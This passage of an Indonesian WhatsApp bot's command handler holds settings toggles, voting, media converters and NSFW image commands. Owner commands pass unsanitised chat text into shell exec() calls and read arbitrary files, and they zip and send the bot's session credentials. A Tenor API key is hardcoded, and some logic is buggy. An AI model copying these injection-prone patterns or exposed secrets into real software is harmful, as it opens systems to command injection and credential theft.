if (db.data.settings[botNumber].replytype == "web3") return setReply("Sudah Active")
db.data.settings[botNumber].replytype = "web3"
await setReply(`Berhasil Mengganti Reply Ke ${args[0]}`)
} else if (args[0] == "mess") {
if (db.data.settings[botNumber].replytype == "mess") return setReply("Sudah Active")
db.data.settings[botNumber].replytype = "mess"
await setReply(`Berhasil Mengganti Reply Ke ${args[0]}`)
} else {
const sections = [ {
title: `SILAHKAN PILIH`,
rows: [
{title: "WEB1", rowId: `${prefix + command} web1`, description: "TYPE WEB1"},
{title: "WEB2", rowId: `${prefix + command} web2`, description: "TYPE WEB2"},
{title: "WEB3", rowId: `${prefix + command} web3`, description: "TYPE WEB3"},
{title: "MESS", rowId: `${prefix + command} mess`, description: "TYPE MESS"},
]}]
const listMessage = { text: `SETTINGS REPLY BOT`, buttonText: "Click Here", sections }
zyren.sendMessage(m.chat, listMessage, { quoted: m })                    
}
break
//=================================================//
case "setwelcome":
if (!isCreator) return onlyOwner()
if (args[0] == "location") {
if (db.data.settings[botNumber].setwelcome == "location") return setReply("Sudah Active")
db.data.settings[botNumber].setwelcome = "location"
setReply(`Berhasil Mengganti Welcome Ke ${args[0]}`)
} else if (args[0] == "image") {
if (db.data.settings[botNumber].setwelcome == "image") return setReply("Sudah Active")
db.data.settings[botNumber].setwelcome = "image"
setReply(`Berhasil Mengganti Welcome Ke ${args[0]}`)
} else if (args[0] == "gif") {
if (db.data.settings[botNumber].setwelcome == "gif") return setReply("Sudah Active")
db.data.settings[botNumber].setwelcome = "gif"
setReply(`Berhasil Mengganti Welcome Ke ${args[0]}`)
} else if (args[0] == "video") {
if (db.data.settings[botNumber].setwelcome == "video") return setReply("Sudah Active")
db.data.settings[botNumber].setwelcome = "video"
setReply(`Berhasil Mengganti Welcome Ke ${args[0]}`)
} else {
const sections = [ {
title: `SILAHKAN PILIH`,
rows: [
{title: "LOCATION", rowId: `${prefix + command} location`, description: "TYPE LOCATION"},
{title: "IMAGE", rowId: `${prefix + command} image`, description: "TYPE IMAGE"},
{title: "GIF", rowId: `${prefix + command} gif`, description: "TYPE GIF"},
{title: "VIDEO", rowId: `${prefix + command} video`, description: "TYPE VIDEO"},
]}]
const listMessage = { text: `SETTINGS WELCOME BOT`, buttonText: "Click Here", sections }
zyren.sendMessage(m.chat, listMessage, { quoted: m })
}
break
//=================================================//
case "auto":
if (!isCreator) return onlyOwner()
if (args[0] == "recording") {
if (db.data.settings[botNumber].auto == "recording") return setReply("Sudah Active")
db.data.settings[botNumber].auto = "recording"
setReply(`Mode auto ${args[0]} Telah Active`)
} else if (args[0] == "typing") {
if (db.data.settings[botNumber].auto == "typing") return setReply("Sudah Active")
db.data.settings[botNumber].auto = "typing"
setReply(`Mode auto ${args[0]} Telah Active`)
} else if (args[0] == "available") {
if (db.data.settings[botNumber].auto == "available") return setReply("Sudah Active")
db.data.settings[botNumber].auto = "available"
setReply(`Mode auto ${args[0]} Telah Active`)
} else {
zyren.sendButMessage(m.chat, `MODE ${command.toUpperCase()}`, copyright, [
{ buttonId: `${prefix + command} recording`, buttonText: { displayText: "ʀᴇᴄᴏʀᴅɪɴɢ" }, type: 1 },
{ buttonId: `${prefix + command} typing`, buttonText: { displayText: "ᴛʏᴘɪɴɢ" }, type: 1 },
{ buttonId: `${prefix + command} available`, buttonText: { displayText: "ᴀᴠᴀɪʟᴀʙʟᴇ" }, type: 1 }], m)
}
break
//=================================================//
case "autosticker":
if (!isCreator) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autosticker == true) return setReply("Sudah Active")
db.data.settings[botNumber].autosticker = true
setReply("Mode Auto Sticker Telah Active")
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autosticker == false) return setReply("Sudah Nonactive")
db.data.settings[botNumber].autosticker = false
setReply("Mode Auto Sticker Telah Nonactive")
} else {
zyren.sendButMessage(m.chat, `MODE AUTO STICKER`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "autorespon":
if (!isCreator) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autorespon == true) return setReply("Sudah Active")
db.data.settings[botNumber].autorespon = true
setReply("Mode Auto Respon Telah Active")
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autorespon == false) return setReply("Sudah Nonactive")
db.data.settings[botNumber].autorespon = false
setReply("Mode Auto Respon Telah Nonactive")
} else {
zyren.sendButMessage(m.chat, `MODE AUTO RESPON`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "autoread":
if (!isCreator) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autoread == true) return setReply("Sudah Active")
db.data.settings[botNumber].autoread = true
setReply("Mode Auto Read Telah Active")
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autoread == false) return setReply("Sudah Nonactive")
db.data.settings[botNumber].autoread = false
setReply("Mode Auto Read Telah Nonactive")
} else {
zyren.sendButMessage(m.chat, `MODE AUTO READ`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "autovn":
if (!isCreator) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autovn == true) return setReply("Sudah Active")
db.data.settings[botNumber].autovn = true
setReply("Mode Auto Vn Telah Active")
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autovn == false) return setReply("Sudah Nonactive")
db.data.settings[botNumber].autovn = false
setReply("Mode Auto Vn Telah Nonactive")
} else {
zyren.sendButMessage(m.chat, `MODE AUTO VN`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "anticall":
if (!isCreator) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].anticall == true) return setReply("Sudah Active")
db.data.settings[botNumber].anticall = true
setReply("Mode Anti Call Telah Active")
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].anticall == false) return setReply("Sudah Nonactive")
db.data.settings[botNumber].anticall = false
setReply("Mode Anti Call Telah Nonactive")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI CALL`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "mode":
if (!isCreator) return onlyOwner()
if (args[0] == "public") {
if (db.data.settings[botNumber].public == true) return setReply("Sudah Active")
db.data.settings[botNumber].public = true
setReply("Mode Public Telah Active")
} else if (args[0] == "self") {
if (db.data.settings[botNumber].public == false) return setReply("Sudah Active")
db.data.settings[botNumber].public = false
setReply("Mode Self Telah Active")
} else {
zyren.sendButMessage(m.chat, `MODE PUBLIK/SELF`, copyright, [
{ buttonId: `${prefix + command} public`, buttonText: { displayText: "𝙿𝚄𝙱𝙻𝙸𝙺" }, type: 1 },
{ buttonId: `${prefix + command} self`, buttonText: { displayText: "𝚂𝙴𝙻𝙵" }, type: 1 }], m)
}
break
//=================================================//
case "getfile":{
if (!isCreator) return onlyOwner()
if (m.isGroup) return setReply(mess.private)
if (!text.includes("./")) return setReply(`*Example* : ${prefix + command} ./package.json`)
setTimeout(() => {
const file = fs.readFileSync(`${text}`)
zyren.sendMessage(m.chat, { document: file, mimetype: "application/bin", fileName: `${path.basename(text)}` }, { quoted: m })
}, 2000)
setReply("Send file......")
}
break
//=================================================//
case "getfolder":{
if (!isCreator) return onlyOwner()
if (m.isGroup) return setReply(mess.private)
if (!text.includes("./")) return setReply(`*Example* : ${prefix + command} ./basetzy`)
if (text.split("/")[1] == "node_modules" && !text.split("/")[1]) {
setReply("Au Ah Sizenya G Ngotak😑")
} else {
setTimeout(() => {
fs.unlinkSync(`${text}.zip`)
}, 5000)
setTimeout(() => {
const file = fs.readFileSync(`${text}.zip`)
zyren.sendMessage(m.chat, { document: file, mimetype: "application/bin", fileName: `${path.basename(`${text}.zip`)}` }, { quoted: m })
}, 3000)
setTimeout(() => {
setReply("Send file......")
}, 2000)
setTimeout(() => {
let qur = `zip -r ${text}.zip ${text}`
exec(qur, (err, stdout) => {
})
}, 1000)
}
}
break
//=================================================//
case "getsesi":{
if (!isCreator) return onlyOwner()
if (m.isGroup) return setReply(mess.private)
if (args[0] == "jadibot") {
let files = fs.readdirSync("./jadibot-sesion")
let data = files.splice("@Xzra", files.length - 1)
if (!data.includes(m.sender.split("@")[0])) return setReply("Kamu Tidak Ada Di List Jadi Bot")
setTimeout(() => {
fs.unlinkSync(`./jadibot-sesion/${m.sender.split("@")[0]}.zip`)
}, 5000)
setTimeout(() => {
const file = fs.readFileSync(`./jadibot-sesion/${m.sender.split("@")[0]}.zip`)
zyren.sendMessage(m.chat, { document: file, mimetype: "application/bin", fileName: `${m.sender.split("@")[0]}.zip` }, { quoted: m })
}, 3000)
setTimeout(() => {
setReply("Send file......")
}, 2000)
setTimeout(() => {
let qur = `zip -r ./jadibot-sesion/${m.sender.split("@")[0]}.zip ./jadibot-sesion/${m.sender.split("@")[0]}.zip`
exec(qur, (err, stdout) => {
})
}, 1000)
} else {
if (!isCreator) return onlyOwner()
setTimeout(() => {
fs.unlinkSync(`./sessionye.zip`)
}, 5000)
setTimeout(() => {
const file = fs.readFileSync(`./sessionye.zip`)
zyren.sendMessage(m.chat, { document: file, mimetype: "application/bin", fileName: `session.zip` }, { quoted: m })
}, 3000)
setTimeout(() => {
setReply("Send file......")
}, 2000)
setTimeout(() => {
let qur = `zip -r ./sessionye.zip ./sessionye`
exec(qur, (err, stdout) => {
})
}, 1000)
}
}
break
//=================================================//
case "chat":
if (!isCreator) return onlyOwner()
if (args[0] == "pin") {
await zyren.chatModify({ pin: true }, m.chat)
} else if (args[0] == "unpin") {
await zyren.chatModify({ pin: false }, m.chat)
} else if (args[0] == "archive") {
await zyren.chatModify({ archive: true, lastMessages: [m] }, m.chat)
} else if (args[0] == "unarchive") {
await zyren.chatModify({ archive: false, lastMessages: [m] }, m.chat)
} else if (args[0] === "mute") {
await zyren.chatModify({ mute: "Infinity" }, m.chat, [])
} else if (args[0] === "unmute") {
await zyren.chatModify({ mute: null }, m.chat, [])
} else if (args[0] === "read") {
await zyren.chatModify({ markRead: true, lastMessages: [m] }, m.chat)
} else if (args[0] === "unread") {
await zyren.chatModify({ markRead: false, lastMessages: [m] }, m.chat)
} else if (args[0] == "delete") {
await zyren.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp.low }]}, m.chat)
} else if (m.isGroup) {
const sections = [ {
title: `PLEASE SELECT`,
rows: [
{title: "PIN", rowId: `${prefix + command} pin`, description: "CHAT PIN"}, 
{title: "UNPIN", rowId: `${prefix + command} unpin`, description: "CHAT UNPIN"},
{title: "ARCHIVE", rowId: `${prefix + command} archive`, description: "CHAT ARCHIVE"},
{title: "UNARCHIVE", rowId: `${prefix + command} unarchive`, description: "CHAT UNARCHIVE"},
{title: "MUTE", rowId: `${prefix + command} mute`, description: "CHAT MUTE"},
{title: "UNMUTE", rowId: `${prefix + command} unmute`, description: "CHAT UNMUTE"},
{title: "READ", rowId: `${prefix + command} read`, description: "CHAT READ"},
{title: "UNREAD", rowId: `${prefix + command} unread`, description: "CHAT UNREAD"},
]}]
const listMessage = { text: `${command.toUpperCase()}`, buttonText: "Click Here", sections }
zyren.sendMessage(m.chat, listMessage, { quoted: m })
} else if (!m.isGroup) {
const sections = [ {
title: `PLEASE SELECT`,
rows: [
{title: "PIN", rowId: `${prefix + command} pin`, description: "CHAT PIN"}, 
{title: "UNPIN", rowId: `${prefix + command} unpin`, description: "CHAT UNPIN"},
{title: "ARCHIVE", rowId: `${prefix + command} archive`, description: "CHAT ARCHIVE"},
{title: "UNARCHIVE", rowId: `${prefix + command} unarchive`, description: "CHAT UNARCHIVE"},
{title: "MUTE", rowId: `${prefix + command} mute`, description: "CHAT MUTE"},
{title: "UNMUTE", rowId: `${prefix + command} unmute`, description: "CHAT UNMUTE"},
{title: "READ", rowId: `${prefix + command} read`, description: "CHAT READ"},
{title: "UNREAD", rowId: `${prefix + command} unread`, description: "CHAT UNREAD"},
{title: "DELETE", rowId: `${prefix + command} delete`, description: "CHAT DELETE"},
]}]
const listMessage = { text: `${command.toUpperCase()}`, buttonText: "Click Here", sections }
zyren.sendMessage(m.chat, listMessage, { quoted: m })
}
break
//=================================================//
case "trap" :
if (isBan) return 
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
if (!isAntiNsfw) return setReply(mess.nsfw)
setReply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
 let trapbot = [
    {buttonId: `trap`, buttonText: {displayText: `Next ⚡`}, type: 1},
    ]
  let button2Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here you go!`,
  buttons: trapbot,
  headerType: 1
  }     
            await zyren.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
                    return("Error!")
                })
break
case "hentai-neko" :
case "hneko" :
   if (isBan) return 
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
if (!isAntiNsfw) return setReply(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let hnekobot = [
    {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
    ]
  let button3Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here you go!`,
  buttons: hnekobot,
  headerType: 1
  }      
            await zyren.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
                    return("Error!")
                })
break
case "hentai-waifu" :
case "nwaifu" :
   if (isBan) return 
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
if (!isAntiNsfw) return setReply(mess.nsfw)
setReply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
 let nwaifubot = [
    {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
    ]
  let button4Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here you go!`,
  buttons: nwaifubot,
  headerType: 1
  }      
            await zyren.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
                    return("Error!")
                })
break
case "gasm":
   if (isBan) return 
  if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
  if (!isAntiNsfw) return setReply(mess.nsfw)
setReply(mess.wait)            
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonsssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: copyright,
      buttons: wbuttsss,
      headerType: 4
      }     
            await zyren.sendMessage(m.chat, buttonsssMessages,{ quoted:m }).catch(err => {
                    return("Error!")
                })
break   
//=================================================//
case "style": case "styletext": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply("Masukkan Query text!") 
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `⭔ *${i.name}* : ${i.result}\n\n`
}
setReply(teks)
}
break
//=================================================//
case "vote": {
if (!isCreator) return onlyOwner()
if (!m.isGroup) return onlyGroup()
if (m.chat in vote) return setReply(`_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`) 
if (!text) return setReply(`Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`) 
setReply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
vote[m.chat] = [q, [], []]
await sleep(1000)
upvote = vote[m.chat][1]
devote = vote[m.chat][2]
teks_vote = `*「 VOTE 」*
*Alasan:* ${vote[m.chat][0]}
┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────
┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────
*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
{buttonId: `${prefix}upvote`, buttonText: {displayText: "𝚄𝙿𝚅𝙾𝚃𝙴"}, type: 1},
{buttonId: `${prefix}devote`, buttonText: {displayText: "𝙳𝙴𝚅𝙾𝚃𝙴"}, type: 1}
]
let buttonMessageVote = {
text: teks_vote,
footer: copyright,
buttons: buttonsVote,
headerType: 1
}
zyren.sendMessage(m.chat, buttonMessageVote)
}
break
//=================================================//
 case "upvote": {
if (!m.isGroup) return onlyGroup()
if (isBan) return //sticBanLu(from)
if (!(m.chat in vote)) return setReply(`_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`) 
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) return setReply("Kamu Sudah Vote") 
vote[m.chat][1].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*
*Alasan:* ${vote[m.chat][0]}
┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────
┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────
*${prefix}hapusvote* - untuk menghapus vote`
let buttonsUpvote = [
{buttonId: `${prefix}upvote`, buttonText: {displayText: "𝚄𝙿𝚅𝙾𝚃𝙴"}, type: 1},
{buttonId: `${prefix}devote`, buttonText: {displayText: "𝙳𝙴𝚅𝙾𝚃𝙴"}, type: 1}
]
let buttonMessageUpvote = {
text: teks_vote,
footer: copyright,
buttons: buttonsUpvote,
headerType: 1,
mentions: menvote
 }
zyren.sendMessage(m.chat, buttonMessageUpvote)
}
 break
//=================================================//
case "devote": {
if (!m.isGroup) return onlyGroup()
if (isBan) return //sticBanLu(from)
if (!(m.chat in vote)) return setReply(`_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`) 
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) return setReply("Kamu Sudah Vote") 
vote[m.chat][2].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*
*Alasan:* ${vote[m.chat][0]}
┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────
┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────
*${prefix}hapusvote* - untuk menghapus vote`
let buttonsDevote = [
{buttonId: `${prefix}upvote`, buttonText: {displayText: "𝚄𝙿𝚅𝙾𝚃𝙴"}, type: 1},
{buttonId: `${prefix}devote`, buttonText: {displayText: "𝙳𝙴𝚅𝙾𝚃𝙴"}, type: 1}
]
let buttonMessageDevote = {
text: teks_vote,
footer: copyright,
buttons: buttonsDevote,
headerType: 1,
mentions: menvote
}
zyren.sendMessage(m.chat, buttonMessageDevote)
}
break
//=================================================// 
case "cekvote":
if (!isCreator) return onlyOwner()
if (!m.isGroup) return onlyGroup()
if (!(m.chat in vote)) return setReply(`_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`) 
teks_vote = `*「 VOTE 」*
*Alasan:* ${vote[m.chat][0]}
┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────
┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join("\n")}
│ 
└────
*${prefix}hapusvote* - untuk menghapus vote
©${zyren.user.id}`
zyren.sendTextWithMentions(m.chat, teks_vote, m)
break
case "deletevote": case"delvote": case "hapusvote": {
if (!isCreator) return onlyOwner()
if (!m.isGroup) return onlyGroup()
if (!(m.chat in vote)) return setReply(`_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`) 
delete vote[m.chat]
setReply("Berhasil Menghapus Sesi Vote Di Grup Ini")
}
break
//=================================================//
case "sticker": case "s": case "stickergif": case "sgif": {
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`Balas Video/Image Dengan Caption ${prefix + command}`) 
if (/image/.test(mime)) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
zyren.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return setReply("Maksimal 10 detik!")
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
zyren.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
setReply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`) 
}
}
break
//=================================================//
case "ebinary": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} text`) 
let { eBinary } = require("../basetzy/lib/binary")
let eb = await eBinary(text)
setReply(eb)
}
break
//=================================================//
case "dbinary": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} text`) 
let { dBinary } = require("../basetzy/lib/binary")
let db = await dBinary(text)
setReply(db)
}
break
//=================================================//
case "emojimix": {
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
let [emoji1, emoji2] = text.split`+`
if (!emoji1) return setReply(`Example : ${prefix + command} 😅+🤔`) 
if (!emoji2) return setReply(`Example : ${prefix + command} 😅+🤔`) 
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await zyren.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case "emojimix2": {
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
if (!text) return setReply(`Example : ${prefix + command} 😅`) 
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await zyren.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case "attp": case "ttp": {
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
if (!text) return setReply(`Example : ${prefix + command} text`) 
await zyren.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, "zyren", "morou", m, {asSticker: true})
}
break
//=================================================// 
case "smeme": case "stickermeme": case "stickmeme": {
if (!text) return setReply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (text.includes("|")) return setReply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return setReply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
onlyWait()
arg = args.join(" ")
mee = await zyren.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await zyren.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break 
case "toimage": case "toimg": {
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply("Reply Image") 
if (!/webp/.test(mime)) return setReply(`Balas sticker dengan caption *${prefix + command}*`) 
let media = await zyren.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom(".png")
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
zyren.sendMessage(m.chat, { image: buffer }, { quoted: tzy })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case "tomp4": case "tovideo": {
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
if (!quoted) return setReply("Reply Image") 
if (!/webp/.test(mime)) return setReply(`*reply sticker with caption* *${prefix + command}*`) 
let media = await zyren.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await zyren.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: "Convert Webp To Video" } }, { quoted: tzy })
await fs.unlinkSync(media)
}
break
case "toaud": case "toaudio": {
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
if (!/video/.test(mime) && !/audio/.test(mime)) return setReply(`*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`) 
if (!quoted) return setReply(`*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`) 
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
let audio = await toAudio(media, "mp4")
zyren.sendMessage(m.chat, {audio: audio, mimetype: "audio/mpeg"}, { quoted : tzy })
}
break
case "tomp3": {
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
if (/document/.test(mime)) return setReply(`*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`) 
if (!/video/.test(mime) && !/audio/.test(mime)) return setReply(`*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`) 
if (!quoted) return setReply(`*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`) 
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
let audio = await toAudio(media, "mp4")
zyren.sendMessage(m.chat, {document: audio, mimetype: "audio/mpeg", fileName: `Convert By ${zyren.user.name}.mp3`}, { quoted : tzy })
}
break
case "tovn": case "toptt": {
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
if (!/video/.test(mime) && !/audio/.test(mime)) return setReply(`*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`) 
if (!quoted) return setReply(`*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`) 
onlyWait()
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
let audio = await toPTT(media, "mp4")
zyren.sendMessage(m.chat, {audio: audio, mimetype:"audio/mpeg", ptt:true }, {quoted:tzy})
}
break
case "togif": {
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
if (!quoted) return setReply("Reply Image") 
if (!/webp/.test(mime)) return setReply(`*reply sticker with caption* *${prefix + command}*`) 
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
let webpToMp4 = await webp2mp4File(media)
await zyren.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: "Convert Webp To Video" }, gifPlayback: true }, { quoted: tzy })
await fs.unlinkSync(media)
}
break
//=================================================//
case "tourl":{
if (isImage || isQuotedImage) {
onlyWait() 
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
const anu = await UploadFileUgu(media)
await setReply(anu.url)
} else if (isVideo || isQuotedVideo) {
onlyWait() 
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
const anu = await UploadFileUgu(media)
await setReply(anu.url)
} else if (isQuotedAudio) {
onlyWait() 
